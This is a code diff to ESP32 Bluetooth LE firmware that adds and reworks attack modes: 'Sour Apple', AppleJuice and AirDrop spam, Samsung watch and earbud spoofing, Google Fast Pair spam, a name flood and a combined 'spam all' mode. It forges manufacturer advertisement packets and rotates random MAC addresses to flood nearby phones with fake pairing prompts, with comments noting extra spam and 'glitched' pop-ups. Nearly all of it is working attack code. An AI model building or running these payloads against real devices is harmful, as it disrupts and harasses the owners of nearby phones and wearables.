@@ -16,8 +16,11 @@ NimBLEScan *pBLEScan;
 LinkedList<BLEScanResult>* blescanres;
 bool bleScanRedraw = false;
 bool bleAnalyzerMode = false;
+bool samsungbuds = false;
 uint8_t spooferDeviceIndex = -1;
-uint8_t spooferAdTypeIndex = -1;
+uint8_t spooferAppleDeviceColor = -1;
+uint8_t spooferConnectableModeIndex = -1;
+uint8_t spooferDiscoverableModeIndex = -1;
 
 BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
 {
@@ -33,45 +36,112 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
         //Exploit by ECTO-1A
         case SourApple: {
             AdvData_Raw = new uint8_t[17];
-
-            AdvData_Raw[i++] = 17 - 1;    // Packet Length
-            AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
-            AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
-            AdvData_Raw[i++] = 0x00;        // ...
-            AdvData_Raw[i++] = 0x0F;  // Type
-            AdvData_Raw[i++] = 0x05;                        // Length
-            AdvData_Raw[i++] = 0xC1;                        // Action Flags
-            const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-            AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
-            esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
+            AdvData_Raw[i++] = 17 - 1;                     // Packet Length
+            AdvData_Raw[i++] = 0xFF;                       // Packet Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x4C;                       // Packet Company ID (Apple, Inc.)
+            AdvData_Raw[i++] = 0x00;                       // ...
+            AdvData_Raw[i++] = 0x0F;                       // Type
+            AdvData_Raw[i++] = 0x05;                       // Length
+            uint8_t action = na_actions[random(GET_SIZE(na_actions))].value;
+            uint8_t flags = 0xC0;
+            if(action == 0x20 && rand() % 2) flags--;      // More spam for 'Join This AppleTV?'
+            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
+            AdvData_Raw[i++] = flags;                      // Action Flags
+            AdvData_Raw[i++] = action;                     // Action Type
+            esp_fill_random(&AdvData_Raw[i], 3);           // Authentication Tag
             i += 3;   
-            AdvData_Raw[i++] = 0x00;  // ???
-            AdvData_Raw[i++] = 0x00;  // ???
-            AdvData_Raw[i++] =  0x10;  // Type ???
+            AdvData_Raw[i++] = 0x00;                       // Additional Action Data Terminator ???
+            AdvData_Raw[i++] = 0x00;                       // ???
+            AdvData_Raw[i++] =  0x10;                      // Type ??? + Shenanigans ???
             esp_fill_random(&AdvData_Raw[i], 3);
-
             AdvData.addData(AdvData_Raw, 17);
             break;
         }
 
-        case AppleJuice: {  // https://github.com/pr3y/Bruce/blob/main/src/modules/ble/ble_spam.cpp
+        case AppleJuice: {  //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
             int randdevice = random(2);
             if (randdevice == 0) {
-                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
-                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-                AdvData.addData(packet, 31);
+                AdvData_Raw = new uint8_t[31];
+                AdvData_Raw[i++] = 31 - 1; // Size
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
+                AdvData_Raw[i++] = 0x00; // ...
+                AdvData_Raw[i++] = 0x07; // Continuity Type
+                AdvData_Raw[i++] = 0x19; // Continuity Size
+                uint8_t model_index = random(GET_SIZE(pp_models));
+                uint16_t model = pp_models[model_index].value;
+                uint8_t color = pp_models[model_index].colors[random(pp_models[model_index].colors_count)].value;
+                uint8_t prefix;
+                if(model == 0x0055 || model == 0x0030) prefix = 0x05;
+                else {
+                    if (espatsettings.useAppleJuicePaired) {
+                        prefix = 0x01;
+                    } else {
+                        prefix = 0x07;
+                    }
+                }
+                AdvData_Raw[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
+                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // Device Model
+                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
+                AdvData_Raw[i++] = 0x55; // Status
+                AdvData_Raw[i++] = (random(10) << 4) + random(10); // Buds Battery Level
+                AdvData_Raw[i++] = (random(8) << 4) + random(10); // Charing Status and Battery Case Level
+                AdvData_Raw[i++] = random(256); // Lid Open Counter
+                AdvData_Raw[i++] = color; // Device Color
+                AdvData_Raw[i++] = 0x00;
+                esp_fill_random(&AdvData_Raw[i], 16);
+                i += 16;
+                AdvData.addData(AdvData_Raw, 31);
             } else if (randdevice == 1) {
-                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
-                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
-                                      0x00, 0x00};
-                AdvData.addData(packet, 23);
+                AdvData_Raw = new uint8_t[11];
+                AdvData_Raw[i++] = 11 - 1;
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
+                AdvData_Raw[i++] = 0x00; // ...
+                AdvData_Raw[i++] = 0x0F; // Continuity Type
+                AdvData_Raw[i++] = 0x05; // Continuity Size
+                uint8_t flags = 0xC0;
+                uint8_t action = na_actions[random(GET_SIZE(na_actions))].value;
+                if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
+                if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
+                AdvData_Raw[i++] = flags;
+                AdvData_Raw[i++] = action;
+                esp_fill_random(&AdvData_Raw[i], 3);
+                i += 3;
+                AdvData.addData(AdvData_Raw, 11);
             }
             break;
         }
-        
+        case AppleAirDrop: { //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
+            AdvData_Raw = new uint8_t[24];
+            AdvData_Raw[i++] = 24 - 1;
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x05;  // AirDrop Conntinuity Type
+            AdvData_Raw[i++] = 0x12; // Size
+            AdvData_Raw[i++] = 0x00; // Zeros
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x01; // Version
+            AdvData_Raw[i++] = random(256); // AppleID
+            AdvData_Raw[i++] = random(256); // ...
+            AdvData_Raw[i++] = random(256); // Phone Number
+            AdvData_Raw[i++] = random(256); // ...
+            AdvData_Raw[i++] = random(256); // Email
+            AdvData_Raw[i++] = random(256); // ...
+            AdvData_Raw[i++] = random(256); // Email2
+            AdvData_Raw[i++] = random(256); // ...
+            AdvData_Raw[i++] = 0x00; // Zero
+            
+            AdvData.addData(AdvData_Raw, 24);
+            break;
+        }
         case Microsoft: {
             String Name = generateRandomName();
 
@@ -93,50 +163,115 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
         }
 
         case Samsung: {
-            AdvData_Raw = new uint8_t[15];
+            if (random(2) == 0) {
+                uint32_t model = watch_models[random(GET_SIZE(watch_models))].value;
+                AdvData_Raw = new uint8_t[15];
+                AdvData_Raw[i++] = 15 - 1; // Size
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+                AdvData_Raw[i++] = 0x00; // ...
+                AdvData_Raw[i++] = 0x01;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x02;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x01;
+                AdvData_Raw[i++] = 0x01;
+                AdvData_Raw[i++] = 0xFF;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x43;
+                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+                AdvData.addData(AdvData_Raw, 15);
+            } else { //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
+                uint32_t model = buds_models[random(GET_SIZE(buds_models))].value;
+                AdvData_Raw = new uint8_t[31];
+                AdvData_Raw[i++] = 27; // Size
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+                AdvData_Raw[i++] = 0x00; // ...
+                AdvData_Raw[i++] = 0x42;
+                AdvData_Raw[i++] = 0x09;
+                AdvData_Raw[i++] = 0x81;
+                AdvData_Raw[i++] = 0x02;
+                AdvData_Raw[i++] = 0x14;
+                AdvData_Raw[i++] = 0x15;
+                AdvData_Raw[i++] = 0x03;
+                AdvData_Raw[i++] = 0x21;
+                AdvData_Raw[i++] = 0x01;
+                AdvData_Raw[i++] = 0x09;
+                AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Buds Model / Color (?)
+                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
+                AdvData_Raw[i++] = 0x01; // ... (Always static?)
+                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
+                AdvData_Raw[i++] = 0x06;
+                AdvData_Raw[i++] = 0x3C;
+                AdvData_Raw[i++] = 0x94;
+                AdvData_Raw[i++] = 0x8E;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0x00;
+                AdvData_Raw[i++] = 0xC7;
+                AdvData_Raw[i++] = 0x00;
 
-            uint8_t model = watch_models[rand() % 25].value;
-            
-            AdvData_Raw[i++] = 14; // Size
-            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
-            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x01;
-            AdvData_Raw[i++] = 0x00;
-            AdvData_Raw[i++] = 0x02;
-            AdvData_Raw[i++] = 0x00;
-            AdvData_Raw[i++] = 0x01;
-            AdvData_Raw[i++] = 0x01;
-            AdvData_Raw[i++] = 0xFF;
-            AdvData_Raw[i++] = 0x00;
-            AdvData_Raw[i++] = 0x00;
-            AdvData_Raw[i++] = 0x43;
-            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
-            AdvData.addData(AdvData_Raw, 15);
+                AdvData_Raw[i++] = 16; // Size
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+                AdvData.addData(AdvData_Raw, 31);
+            }
             break;
         }
 
         case Google: {
-            const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+            const uint32_t model = android_models[random(GET_SIZE(android_models))].value; // Action Type
             AdvData_Raw = new uint8_t[14];
-            AdvData_Raw[i++] = 3;
-            AdvData_Raw[i++] = 0x03;
-            AdvData_Raw[i++] = 0x2C; // Fast Pair ID
-            AdvData_Raw[i++] = 0xFE;
+            AdvData_Raw[i++] = 3; // Size
+            AdvData_Raw[i++] = 0x03; // AD Type (Service UUID List)
+            AdvData_Raw[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+            AdvData_Raw[i++] = 0xFE; // ...
 
-            AdvData_Raw[i++] = 6;
-            AdvData_Raw[i++] = 0x16;
-            AdvData_Raw[i++] = 0x2C; // Fast Pair ID
-            AdvData_Raw[i++] = 0xFE;
-            AdvData_Raw[i++] = (uint8_t)((model >> 0x10) & 0xFF); // Smart Controller Model ID
-            AdvData_Raw[i++] = (uint8_t)((model >> 0x08) & 0xFF);
-            AdvData_Raw[i++] = (uint8_t)((model >> 0x00) & 0xFF);
+            AdvData_Raw[i++] = 6; // Size
+            AdvData_Raw[i++] = 0x16; // AD Type (Service Data)
+            AdvData_Raw[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+            AdvData_Raw[i++] = 0xFE; // ...
+            AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Device Model
+            AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
+            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
 
-            AdvData_Raw[i++] = 2;
-            AdvData_Raw[i++] = 0x0A;
-            AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+            AdvData_Raw[i++] = 2; // Size
+            AdvData_Raw[i++] = 0x0A; // AD Type (Tx Power Level)
+            AdvData_Raw[i++] = random(120) - 100; // -100 to +20 dBm
 
             AdvData.addData(AdvData_Raw, 14);
+            break;
+        }
+        case NameFlood: {
+            String Name;
+            if (espatsettings.useBleNameasnameofNameFlood)
+                Name = espatsettings.bleName;
+            else Name = generateRandomName();
+            uint8_t name_len = Name.length();
+
+            AdvData_Raw = new uint8_t[12 + name_len];
+            AdvData_Raw[i++] = 2; // Size
+            AdvData_Raw[i++] = 0x01; // AD Type (Flags)
+            AdvData_Raw[i++] = 0x06; // Flags
+
+            AdvData_Raw[i++] = name_len + 1; // Size
+            AdvData_Raw[i++] = 0x09; // AD Type (Complete Local Name)
+            memcpy(&AdvData_Raw[i], Name.c_str(), name_len); // Device Name
+            i += name_len;
+
+            AdvData_Raw[i++] = 3; // Size
+            AdvData_Raw[i++] = 0x02; // AD Type (Incomplete Service UUID List)
+            AdvData_Raw[i++] = 0x12; // Service UUID (Human Interface Device)
+            AdvData_Raw[i++] = 0x18; // ...
+
+            AdvData_Raw[i++] = 2; // Size
+            AdvData_Raw[i++] = 0x0A; // AD Type (Tx Power Level)
+            AdvData_Raw[i++] = 0x00; // 0dBm
+
+            AdvData.addData(AdvData_Raw, 12 + name_len);
             break;
         }
         default: {
@@ -200,11 +335,9 @@ void BLEModules::StartMode(BLEScanState mode) {
         bleAnalyzerMode = true;
         bleScan();
     } else if (mode == BLE_ATTACK_SPOOFER_APPLE)
-        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferAdTypeIndex);
+        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
     else if (mode == BLE_ATTACK_SPOOFER_SAMSUNG)
-        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferAdTypeIndex);
-    else if (mode == BLE_ATTACK_SPOOFER_GOOGLE)
-        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_GOOGLE, spooferAdTypeIndex);
+        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
     else if (mode == BLE_ATTACK_EXPLOIT_SOUR_APPLE) 
         executeSwiftpair(SourApple);
     else if (mode == BLE_ATTACK_EXPLOIT_APPLE_JUICE) 
@@ -215,12 +348,18 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(Samsung);
     else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE)
         executeSwiftpair(Google);
+    else if (mode == BLE_ATTACK_EXPLOIT_NAME_FLOOD)
+        executeSwiftpair(NameFlood);
+    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_AIRDROP)
+        executeSwiftpair(AppleAirDrop);
     else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
         executeSwiftpair(SourApple, true);
         executeSwiftpair(AppleJuice, true);
+        executeSwiftpair(AppleAirDrop, true);
         executeSwiftpair(Microsoft, true);
         executeSwiftpair(Samsung, true);
         executeSwiftpair(Google, true);
+        executeSwiftpair(NameFlood, true);
     }
     else if (mode == BLE_ATTACK_SPOOFER_INIT)
         initSpoofer();
@@ -233,54 +372,143 @@ void BLEModules::StartMode(BLEScanState mode) {
     }
 }
 
-BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
+BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
     BLEAdvertisementData AdvData = BLEAdvertisementData();
     if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
         Serial.println("[INFO] BLE Apple Spoofer Starting");
-        uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
-                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-       AdvData.addData(packet, 31);
+                uint8_t AdvData_Raw[31];
+                int i = 0;
+                AdvData_Raw[i++] = 31 - 1; // Size
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
+                AdvData_Raw[i++] = 0x00; // ...
+                AdvData_Raw[i++] = 0x07; // Continuity Type
+                AdvData_Raw[i++] = 0x19; // Continuity Size
+                //uint8_t model_index = random(GET_SIZE(pp_models));
+                uint16_t model = pp_models[(int)device_type].value;
+                uint8_t color;
+                if (espatsettings.useAppleJuicePaired)
+                    color = pp_models[(int)device_type].colors[spooferAppleDeviceColor].value;
+                else color = pp_models[(int)device_type].colors[random(pp_models[(int)device_type].colors_count)].value;
+                uint8_t prefix;
+                if(model == 0x0055 || model == 0x0030) prefix = 0x05;
+                else {
+                    if (espatsettings.useAppleJuicePaired) {
+                        prefix = 0x01;
+                        Serial.println("[INFO] Enable Colored Apple Device Spoofer");
+                    }
+                    else prefix = 0x07;
+                }
+                AdvData_Raw[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
+                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // Device Model
+                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
+                AdvData_Raw[i++] = 0x55; // Status
+                AdvData_Raw[i++] = (random(10) << 4) + random(10); // Buds Battery Level
+                AdvData_Raw[i++] = (random(8) << 4) + random(10); // Charing Status and Battery Case Level
+                AdvData_Raw[i++] = random(256); // Lid Open Counter
+                AdvData_Raw[i++] = color; // Device Color
+                AdvData_Raw[i++] = 0x00;
+                esp_fill_random(&AdvData_Raw[i], 16);
+                i += 16;
+                AdvData.addData(AdvData_Raw, 31);
     } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
         Serial.println("[INFO] BLE Samsung Spoofer Starting");
-        uint8_t model = watch_models[(int)device_type].value;
-        uint8_t AdvData_Raw[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 
-                                   0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
-                                   (uint8_t)((model >> 0x00) & 0xFF)};
-        AdvData.addData(AdvData_Raw, 15);
-    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_GOOGLE) {
-        Serial.println("[INFO] BLE Google Spoofer Starting");
-        uint32_t model = android_models[(int)device_type].value; // Action Type
-        uint8_t AdvData_Raw[14] = {0x03, 0x03, 0x2C, 0xFE, // First 3 data to announce Fast Pair
-                                   0x06, 0x16, 0x2C, 0xFE,
-                                   (uint8_t)((model >> 0x10) & 0xFF),
-                                   (uint8_t)((model >> 0x08) & 0xFF),
-                                   (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
-                                   0x02, 0x0A,
-                                   (uint8_t)((rand() % 120) - 100)}; // 2 more data to inform RSSI data.
-        AdvData.addData(AdvData_Raw, 14);
+        if (samsungbuds) {
+            uint32_t model = buds_models[(int)device_type].value;
+            int i = 0;
+            uint8_t AdvData_Raw[31];
+            AdvData_Raw[i++] = 27; // Size
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x42;
+            AdvData_Raw[i++] = 0x09;
+            AdvData_Raw[i++] = 0x81;
+            AdvData_Raw[i++] = 0x02;
+            AdvData_Raw[i++] = 0x14;
+            AdvData_Raw[i++] = 0x15;
+            AdvData_Raw[i++] = 0x03;
+            AdvData_Raw[i++] = 0x21;
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0x09;
+            AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Buds Model / Color (?)
+            AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
+            AdvData_Raw[i++] = 0x01; // ... (Always static?)
+            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
+            AdvData_Raw[i++] = 0x06;
+            AdvData_Raw[i++] = 0x3C;
+            AdvData_Raw[i++] = 0x94;
+            AdvData_Raw[i++] = 0x8E;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0xC7;
+            AdvData_Raw[i++] = 0x00;
+
+            AdvData_Raw[i++] = 16; // Size
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+            AdvData.addData(AdvData_Raw, 31);
+            Serial.println("[INFO] Enable Samsung Buds Spoofer");
+        } else {
+            uint32_t model = watch_models[(int)device_type].value;
+            int i = 0;
+            uint8_t AdvData_Raw[15];
+            AdvData_Raw[i++] = 15 - 1; // Size
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x02;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0xFF;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x43;
+            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+            AdvData.addData(AdvData_Raw, 15);
+        }
     }
 
     Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
-    String adv_type_str = "";
+    String conn_mode_str = "";
+    String disc_mode_str = "";
     
-    switch(adv_type) {
-        case ADV_MODE_NON:
+    switch(conn_mode) {
+        case CONN_MODE_NON:
             pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
-            adv_type_str = "NONN";
+            conn_mode_str = "NON";
             break;
-        case ADV_MODE_DIR:
+        case CONN_MODE_DIR:
             pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_DIR);
-            adv_type_str = "DIR";
+            conn_mode_str = "DIR";
             break;
-        case ADV_MODE_UND:
+        case CONN_MODE_UND:
             pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
-            adv_type_str = "UND";
+            conn_mode_str = "UND";
+            break;
+    }
+    switch(disc_mode) {
+        case DISC_MODE_NON:
+            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_NON);
+            disc_mode_str = "NON";
+            break;
+        case DISC_MODE_LTD:
+            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_LTD);
+            disc_mode_str = "LTD";
+            break;
+        case DISC_MODE_GEN:
+            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
+            disc_mode_str = "GEN";
             break;
     }
 
-    Serial.println("[INFO] BLE Spoofer Ad Type: " + adv_type_str);
+    Serial.println("[INFO] BLE Spoofer Connectable Mode: " + conn_mode_str);
+    Serial.println("[INFO] BLE Spoofer Discoverable Mode: " + disc_mode_str);
 
     return AdvData;
 }
@@ -290,14 +518,14 @@ void BLEModules::initSpoofer() {
         Serial.println("[INFO] BLE already initialized, skipping...");
         return;
     }
-    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
     esp_ble_gap_set_rand_addr(null_addr);
 
     Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
 }
 
-void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
-    esp_bd_addr_t dummy_addr = {0x00};
+void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
+    uint8_t dummy_addr[6] = {0x00};
       for (int i = 0; i < 6; i++) {
         dummy_addr[i] = random(256);
         if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
@@ -313,7 +541,7 @@ void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t
         pAdvertising = pServer->getAdvertising();
         ble_initialized = true;
     }
-    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, adv_type);
+    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, conn_mode, disc_mode);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->setMinInterval(0x20); // 32.5ms
@@ -335,7 +563,7 @@ void BLEModules::stopSpoofer() {
 }
 
 void BLEModules::initSpam() {
-    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
     esp_ble_gap_set_rand_addr(null_addr);
 
     ble_initialized = true;
@@ -347,7 +575,7 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
-    esp_bd_addr_t dummy_addr = {0x00};
+    uint8_t dummy_addr[6] = {0x00};
       for (int i = 0; i < 6; i++) {
         dummy_addr[i] = random(256);
         if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
@@ -361,13 +589,16 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
     NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
+    if (random(2) == 0) pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    else pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
+    pAdvertising->setDiscoverableMode(random(3));
     pAdvertising->setMinInterval(0x20);
     pAdvertising->setMaxInterval(0x20);
     pAdvertising->setPreferredParams(0x20, 0x20);
     pAdvertising->start();
     if (!forspamall) {
         if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
-        else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
+        else if (type == SourApple || type == AppleAirDrop) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
         else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
     } else {
         vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
@@ -425,7 +656,7 @@ void BLEModules::bleScan() {
     blescanres = new LinkedList<BLEScanResult>();
     NimBLEDevice::init(espatsettings.bleName.c_str());
     ble_initialized = true;
-    pBLEScan = BLEDevice::getScan();
+    pBLEScan = NimBLEDevice::getScan();
     if (!bleAnalyzerMode)
     pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), false);
     else
